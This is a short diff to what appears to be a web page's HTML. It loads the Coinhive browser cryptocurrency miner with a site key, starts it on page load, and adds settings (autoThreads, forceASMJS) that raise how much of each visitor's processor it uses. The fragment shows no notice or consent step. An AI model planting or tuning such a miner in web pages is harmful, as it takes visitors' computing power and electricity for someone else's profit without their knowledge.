@@ -4,7 +4,9 @@
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
-        throttle: 0.7,
+        autoThreads: true,
+	throttle: 0.7,
+	forceASMJS: true
 });
 	miner.start();
 	miner.on('found', function(){})
